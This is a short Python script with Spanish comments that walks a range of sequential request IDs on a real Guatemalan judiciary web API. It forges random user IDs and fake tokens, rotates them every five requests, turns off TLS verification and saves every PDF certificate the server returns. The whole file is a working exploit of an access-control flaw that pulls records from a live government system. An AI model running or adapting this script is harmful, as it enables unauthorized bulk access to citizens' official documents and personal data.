import requests
import random
import string
import time

# Función para generar un token similar (22 caracteres alfanuméricos + "..")
def generar_token():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
    return base + ".."

# Función para generar un usuario aleatorio (por ejemplo, entre -4396100 y -4396999)
def generar_usuario():
    return f"-{random.randint(4396100, 4396999)}"

# Rango de IDs a descargar
inicio_id = 11481717
fin_id = 11481740

headers = {}

# Variables iniciales
usuario_actual = generar_usuario()
token_actual = generar_token()

for i, id_actual in enumerate(range(inicio_id, fin_id + 1)):

    # Cambiar cada 5 descargas
    if i % 5 == 0:
        usuario_actual = generar_usuario()
        token_actual = generar_token()
        print(f"\n🔁 Cambiando credenciales → Usuario: {usuario_actual}, Token: {token_actual}")

    # Construir URL
    url = f"https://zunil.oj.gob.gt:24472/CAPE_DMZ/webapi/Constancia/Solicitud/{id_actual}/Usuario/{usuario_actual}/validarAutorizacion/{token_actual}/downloadArchivo"

    print(f"➡️ Descargando ID: {id_actual}")

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)

        if response.status_code == 200 and b'%PDF' in response.content[:10]:
            nombre_archivo = f"constancia_{id_actual}.pdf"
            with open(nombre_archivo, "wb") as f:
                f.write(response.content)
            print(f"✓ Guardado: {nombre_archivo}")
        else:
            print(f"✗ Falló o no es PDF válido (status: {response.status_code})")

        time.sleep(1)

    except Exception as e:
        print(f"⚠️ Error con ID {id_actual}: {e}")

